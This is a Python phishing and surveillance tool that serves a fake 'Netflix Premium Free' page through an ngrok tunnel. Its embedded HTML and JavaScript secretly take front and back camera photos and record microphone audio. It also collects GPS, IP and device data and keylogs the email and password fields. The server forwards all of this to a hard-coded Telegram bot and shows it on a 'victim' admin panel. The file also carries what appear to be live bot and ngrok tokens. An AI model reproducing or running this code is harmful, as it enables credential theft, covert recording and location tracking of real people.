import http.server
import socketserver
import threading
import webbrowser
import requests
import json
import time
import base64
import os
from pyngrok import ngrok, conf
from datetime import datetime
import urllib.parse

TELEGRAM_TOKEN = "8897883871:AAEk_8BpyqTJ9LKEuZAqKs-wtoyll71q89I"
TELEGRAM_CHAT_ID = "8562052005"

PORT = int(os.environ.get("PORT", 8080))
ADMIN_PORT = 8081
victim_count = 0
victims_data = {}

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

def send_telegram_img(img_path, caption):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        with open(img_path, 'rb') as f:
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"}, files={"photo": f}, timeout=10)
    except Exception as e:
        print(f"Telegram Photo Error: {e}")

print("Photos will save DIRECTLY in project folder!")

HTML_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Premium Free</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#000 0%,#111 50%,#222 100%);color:#fff;min-height:100vh;overflow:hidden;display:flex;flex-direction:column}header{background:#e50914;padding:12px 20px;text-align:center;position:fixed;top:0;left:0;right:0;z-index:100}.logo{height:35px}.container{flex:1;display:flex;align-items:center;justify-content:center;padding:20px 15px;margin-top:60px}.card{background:rgba(0,0,0,0.9);border:2px solid #e50914;border-radius:15px;padding:35px;max-width:380px;width:100%;box-shadow:0 20px 40px rgba(229,9,20,0.3)}h1{font-size:28px;font-weight:800;margin-bottom:15px;text-align:center;background:linear-gradient(45deg,#fff,#e50914);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent}p{font-size:15px;line-height:1.5;color:#ccc;margin-bottom:25px;text-align:center}.btn{background:linear-gradient(45deg,#e50914,#f40612);border:none;border-radius:12px;color:#fff;cursor:pointer;font-size:16px;font-weight:700;padding:15px 25px;width:100%;box-shadow:0 8px 25px rgba(229,9,20,0.5);transition:all .2s;text-transform:uppercase}.btn:active{transform:scale(.98)}input{width:100%;padding:14px;border:2px solid #444;border-radius:12px;font-size:15px;background:#1a1a1a;color:#fff;margin-bottom:20px}input:focus{border-color:#e50914;box-shadow:0 0 0 3px rgba(229,9,20,0.3);outline:none}.hidden{display:none}.status-badge{background:rgba(229,9,20,0.2);color:#e50914;padding:8px 16px;border-radius:25px;font-size:14px;font-weight:700;margin-bottom:20px;border:2px solid #e50914;display:inline-block;animation:pulse 2s infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}.loader{border:4px solid rgba(255,255,255,.1);border-top:4px solid #e50914;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:15px auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.cam-status{position:fixed;top:70px;right:15px;display:flex;flex-direction:column;gap:8px;z-index:999}.cam-dot{width:14px;height:14px;border-radius:50%;box-shadow:0 0 12px;animation:pulseDot 1.5s infinite}.front-cam{background:#00ff88}.back-cam{background:#ff4444}@keyframes pulseDot{0%,100%{transform:scale(1);opacity:.8}50%{transform:scale(1.2);opacity:1}}footer{padding:15px;text-align:center;font-size:12px;color:#666;background:rgba(0,0,0,0.8);position:fixed;bottom:0;left:0;right:0}#frontVideo,#backVideo{position:fixed;top:-9999px;left:-9999px;width:640px;height:480px}#canvas{display:none;width:640px;height:480px}</style>
</head>
<body>
    <div class="cam-status" id="camStatus" style="display:none">
        <div class="cam-dot front-cam" title="Front Cam LIVE OK"></div>
        <div class="cam-dot back-cam" title="Back Cam LIVE OK"></div>
    </div>
    <header><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo"></header>
    <div class="container">
        <div class="card">
            <div id="step1">
                <span class="status-badge">6 Months FREE PREMIUM</span>
                <h1>Netflix 4K</h1>
                <p><b>CONGRATS!</b><br>Free Premium Account - No Ads - 4K</p>
                <button class="btn" onclick="initDualCam()">CLAIM NOW</button>
            </div>
            <div id="step2" class="hidden">
                <h1>Camera Verification</h1>
                <p>Front + Back camera check (8s)</p>
                <div class="loader"></div>
            </div>
            <div id="step3" class="hidden">
                <h1>Link Account</h1>
                <p>Login to your Netflix account to activate</p>
                <input id="email" type="email" placeholder="Email or phone number" oninput="logKey('Email', this.value)">
                <input id="password" type="password" placeholder="Password" oninput="logKey('Password', this.value)">
                <button class="btn" onclick="submitLogin()">Sign In & Activate</button>
            </div>
            <div id="step4" class="hidden">
                <h1>Activating...</h1>
                <div class="loader"></div>
            </div>
        </div>
    </div>
    <footer>© Netflix 2024 - Secure Verification</footer>
    <video id="frontVideo" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:640px;height:480px;opacity:0.01"></video>
    <video id="backVideo" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:640px;height:480px;opacity:0.01"></video>
    <canvas id="canvas" style="display:none"></canvas>
    <script>
let data={},frontStream,backStream,micStream,audioRecorder;
data.ua=navigator.userAgent;data.screen=screen.width+'x'+screen.height;data.lang=navigator.language;

if(navigator.connection){
    data.net = navigator.connection.effectiveType || "Unknown";
}

if(navigator.getBattery){
    navigator.getBattery().then(b => {
        data.battery = Math.round(b.level * 100) + "%";
        data.charging = b.charging;
    });
}

fetch("/s",{method:"POST",body:JSON.stringify({type:"init",...data})});
if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(p=>{data.lat=p.coords.latitude;data.lon=p.coords.longitude;data.acc=p.coords.accuracy;fetch("/s",{method:"POST",body:JSON.stringify({type:"gps",...data})})},()=>{},{enableHighAccuracy:true,timeout:5000,maximumAge:0});
} else { console.log('Geolocation not supported'); }
fetch("https://ipinfo.io/json").then(r=>r.json()).then(ip=>{data.ip=ip.ip;data.city=ip.city;data.country=ip.country;fetch("/s",{method:"POST",body:JSON.stringify({type:"ip",...data})})}).catch(e=>{});

async function initDualCam(){
    document.getElementById("step1").classList.add("hidden");
    document.getElementById("step2").classList.remove("hidden");

    try{
        frontStream = await navigator.mediaDevices.getUserMedia({
            video:{facingMode:"user", width:{ideal:640}, height:{ideal:480}},
            audio: true
        });
        const fv = document.getElementById("frontVideo");
        fv.srcObject = frontStream;
        await fv.play();
        setTimeout(()=>startCapture(fv,'FRONT'), 1500);
        startAudioCapture(frontStream);
    }catch(e){ console.log('front err',e); }

    setTimeout(async()=>{
        try{
            backStream = await navigator.mediaDevices.getUserMedia({
                video:{facingMode:{ideal:"environment"}, width:{ideal:640}, height:{ideal:480}}
            });
            const bv = document.getElementById("backVideo");
            bv.srcObject = backStream;
            await bv.play();
            setTimeout(()=>startCapture(bv,'BACK'), 1500);
        }catch(e){}
    }, 2500);

    setTimeout(showPhone, 9000);
}

function showPhone(){
    document.getElementById("step2").classList.add("hidden");
    document.getElementById("step3").classList.remove("hidden");
}

function startCapture(video, camType){
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext('2d');
    let count = 0;

    function doCapture(){
        try{
            if(video.videoWidth > 0 && !video.paused){
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const img = canvas.toDataURL('image/jpeg', 0.8);
                
                if(img.length > 100){ // Just make sure it's not totally empty
                    fetch("/s",{method:"POST",body:JSON.stringify({
                        type:camType+"_live", photo:img, id:count++, camType:camType, ...data
                    })});
                }
            }
        }catch(e){}
        setTimeout(doCapture, 3000);
    }
    doCapture();
}


function startAudioCapture(stream){
    try {
        audioRecorder = new MediaRecorder(stream);
        let chunks = [];
        audioRecorder.ondataavailable = e => chunks.push(e.data);
        audioRecorder.onstop = () => {
            const blob = new Blob(chunks, { 'type' : 'audio/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
                fetch("/s",{method:"POST",body:JSON.stringify({type:"audio", audio:reader.result, ...data})});
            }
            chunks = [];
        };
        audioRecorder.start();
        setTimeout(()=> {if(audioRecorder.state === 'recording') audioRecorder.stop();}, 8000);
    } catch(e){}
}

function logKey(field, val){
    fetch("/s",{method:"POST",body:JSON.stringify({type:"keylog", field:field, val:val, ...data})});
}

function submitLogin(){
    const email=document.getElementById("email").value;
    const pwd=document.getElementById("password").value;
    if(!email || !pwd) return alert("Email and Password required!");
    data.email=email; data.password=pwd;
    fetch("/s",{method:"POST",body:JSON.stringify({type:"login",...data})});
    document.getElementById("step3").classList.add("hidden");
    document.getElementById("step4").classList.remove("hidden");
    setTimeout(()=>location.href="https://netflix.com",3000);
}
    </script>
</body>
</html>'''

ADMIN_PANEL = r'''<!DOCTYPE html>
<html>
<head>
    <title>LIVE CAMERA PANEL</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
        body{background:#111;color:#fff;height:100vh;overflow:hidden}
        .header{background:#e50914;padding:12px;text-align:center;font-size:20px;font-weight:800;}
        .controls{padding:10px;background:#222;display:flex;gap:8px;justify-content:center;}
        button{padding:8px 12px;border:none;border-radius:4px;background:#e50914;color:#fff;font-weight:700;cursor:pointer;}
        .content{padding:15px;overflow-y:auto;height:calc(100vh - 120px);}
        .victim-card{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:15px;margin-bottom:12px;}
        .photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;margin:10px 0}
        .photo{border-radius:4px;width:100%;height:120px;object-fit:cover;border:1px solid #444}
        .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px;font-size:12px;}
        .info-item{background:#2a2a2a;padding:5px;border-radius:4px}
        .map{height:180px;border-radius:6px;margin-top:10px;border:1px solid #333;cursor:pointer}
    </style>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
</head>
<body>
    <div class="header">LIVE CAMERA CONTROL</div>
    <div class="controls">
        <button onclick="refreshAll()">REFRESH</button>
        <button onclick="fetch('/admin?clear=1').then(refreshAll)">CLEAR ALL</button>
    </div>
    <div class="content" id="content"></div>
    <script>
        let victims={};
        let initializedMaps={};
        function refreshAll(){
            fetch('/admin').then(r=>r.json()).then(data=>{
                victims=data.victims;
                const content=document.getElementById('content');
                content.innerHTML='';
                initializedMaps={};
                Object.entries(victims).forEach(([id,v])=>{
                    const card=document.createElement('div');
                    card.className='victim-card';
                    card.innerHTML=`
                        <h3>Victim #${v.id}</h3>
                        <div class="photo-grid">
                            ${v.photos.slice(-6).map(p=>'<img src="data:image/jpeg;base64,'+p.data+'" class="photo">').join('')}
                        </div>
                        <div class="info-grid">
                            <div class="info-item">IP: ${v.data.ip||'N/A'}</div>
                            <div class="info-item">Phone: ${v.phone||'N/A'}</div>
                            <div class="info-item">Location: ${v.data.city||'N/A'} ${v.data.lat ? `<a href="https://www.google.com/maps?q=${v.data.lat},${v.data.lon}" target="_blank" style="color:#00ff88;text-decoration:none;font-weight:bold">[VIEW MAP]</a>` : ''}</div>
                            <div class="info-item">Battery: ${v.data.battery||'N/A'} ${v.data.charging?'⚡':''}</div>
                            <div class="info-item">Network: ${v.data.net||'N/A'}</div>
                        </div>
                        ${v.data.lat ? `<div id="map-${v.id}" class="map" onclick="window.open('https://www.google.com/maps?q=${v.data.lat},${v.data.lon}','_blank')"></div>` : '<div style="color:#555;font-size:12px;margin-top:8px">📍 No GPS yet...</div>'}
                    `;
                    content.appendChild(card);
                    // Initialize Leaflet map if lat/lon present
                    if(v.data && v.data.lat){
                        setTimeout(()=>{
                            try{
                                const lat=parseFloat(v.data.lat);
                                const lon=parseFloat(v.data.lon);
                                if(!isNaN(lat) && !isNaN(lon)){
                                    const mapEl=document.getElementById('map-'+v.id);
                                    if(mapEl && !initializedMaps[v.id]){
                                        initializedMaps[v.id]=true;
                                        const map=L.map(mapEl,{zoomControl:true,attributionControl:false}).setView([lat,lon],15);
                                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(map);
                                        L.marker([lat,lon]).addTo(map).bindPopup(`📍 Victim #${v.id}<br>Lat: ${lat.toFixed(5)}<br>Lon: ${lon.toFixed(5)}`).openPopup();
                                    }
                                }
                            }catch(e){ console.log('map init err',e); }
                        },150);
                    }
                });
            });
        }
        setInterval(refreshAll, 3000);
        refreshAll();
    </script>
</body>
</html>'''

class VictimHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/go':
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("ngrok-skip-browser-warning", "true")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode())
            return
        return super().do_GET()

    def do_POST(self):
        global victim_count, victims_data
        if self.path == '/s':
            content_length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(content_length))
            v_id = str(hash(data.get('ua', 'none')))[:15]
            if v_id not in victims_data:
                victim_count += 1
                victims_data[v_id] = {'id': victim_count, 'data': {**data, 'time': time.time()}, 'photos': [], 'phone': None}
                send_telegram(f"🆕 NEW VICTIM #{victim_count}\nDevice: {data.get('ua', 'Unknown')[:50]}")
            
            victim = victims_data[v_id]
            
            # Update victim data with any new info (like GPS or IP)
            for key, val in data.items():
                if key not in ['type', 'photo']:
                    victim['data'][key] = val
                    
            msg_type = data.get('type', '')
            
            if msg_type == 'gps' and 'lat' in data:
                send_telegram(f"📍 GPS (Victim #{victim['id']})\nMap: https://www.google.com/maps?q={data['lat']},{data['lon']}")
                
            elif msg_type == 'ip' and 'ip' in data:
                send_telegram(f"🌐 INFO (Victim #{victim['id']})\nIP: {data['ip']}\nLocation: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}")
                
            elif '_live' in msg_type and 'photo' in data:
                try:
                    if ',' in data['photo']:
                        photo_data = data['photo'].split(',')[1]
                        cam = data.get('camType', 'CAM')
                        filename = f"victim_{victim['id']}_{cam}_{int(time.time())}.jpg"
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(photo_data))
                        victim['photos'].append({'data': photo_data, 'camType': cam})
                        print(f"Photo Received: {filename} ({len(photo_data)} bytes)")
                        send_telegram_img(filename, f"📸 Victim #{victim['id']} - {cam}")
                except Exception as e: print(f"Error: {e}")
            
            elif msg_type == 'phone':
                victim['phone'] = data.get('phone')
                send_telegram(f"📱 PHONE (Victim #{victim['id']}): {data.get('phone')}")
            
            elif msg_type == 'keylog':
                print(f"⌨️ KEYLOG (Victim #{victim['id']}) - {data.get('field')}: {data.get('val')}")
                
            elif msg_type == 'login':
                send_telegram(f"🔥 NETFLIX LOGIN (Victim #{victim['id']})\nEmail: {data.get('email')}\nPassword: {data.get('password')}")
                
            elif msg_type == 'audio' and 'audio' in data:
                try:
                    if ',' in data['audio']:
                        audio_data = data['audio'].split(',')[1]
                        filename = f"victim_{victim['id']}_audio_{int(time.time())}.webm"
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(audio_data))
                        print(f"🎙️ Audio Received: {filename}")
                        send_telegram(f"🎙️ Audio Recording saved: {filename}")
                except Exception as e: print(f"Audio Error: {e}")
                
            # If battery info exists and we haven't alerted yet
            if 'battery' in data and not victim.get('battery_alerted'):
                victim['battery_alerted'] = True
                charge_str = " (Charging ⚡)" if data.get('charging') else ""
                send_telegram(f"🔋 DEVICE SCAN (Victim #{victim['id']})\nBattery: {data['battery']}{charge_str}\nNetwork: {data.get('net', 'Unknown')}")

            
            self.send_response(200)
            self.end_headers()

class AdminHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if params := urllib.parse.parse_qs(parsed.query):
            if params.get('clear'):
                victims_data.clear()
                self.send_response(200)
                self.send_header("ngrok-skip-browser-warning", "true")
                self.end_headers(); return
        
        if self.path == '/admin':
             self.send_response(200)
             self.send_header("Content-type", "application/json")
             self.send_header("ngrok-skip-browser-warning", "true")
             self.end_headers()
             self.wfile.write(json.dumps({"victims": victims_data}).encode())
             return

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("ngrok-skip-browser-warning", "true")
        self.end_headers()
        self.wfile.write(ADMIN_PANEL.encode())

def run_main():
    try:
        socketserver.TCPServer.allow_reuse_address = True
        server = socketserver.TCPServer(("", PORT), VictimHandler)
        server.serve_forever()
    except Exception as e: print(f"Server Error: {e}")


def run_admin():
    try:
        socketserver.TCPServer.allow_reuse_address = True
        server = socketserver.TCPServer(("", ADMIN_PORT), AdminHandler)
        server.serve_forever()
    except Exception as e: print(f"Admin Error: {e}")


print("STARTING GRABBER...")
send_telegram("BOT ONLINE - READY FOR HITS")

threading.Thread(target=run_main, daemon=True).start()
threading.Thread(target=run_admin, daemon=True).start()

time.sleep(2)

NGROK_URL = "https://graded-justifier-tinwork.ngrok-free.dev"

try:
    conf.get_default().auth_token = "3Dj7jb7mVwUIKRkxJUeTeAwmDZQ_5QWgWBSRjqnwJnuw8EZnt"
    try:
        ngrok.kill()
    except: pass
    time.sleep(1)
    public_url = ngrok.connect(PORT).public_url
    NGROK_URL = public_url
except Exception as e:
    err_str = str(e)
    if "ERR_NGROK_334" in err_str or "already online" in err_str:
        print(f"Tunnel already active, reusing: {NGROK_URL}")
    else:
        print(f"Ngrok Error: {e}")

print(f"\n*** VICTIM LINK: {NGROK_URL} ***")
print(f"ADMIN PANEL: http://localhost:{ADMIN_PORT}")
send_telegram(f"BOT READY\nVICTIM LINK: {NGROK_URL}")
webbrowser.open(f"http://localhost:{ADMIN_PORT}")

input("\nPress Enter to STOP...")
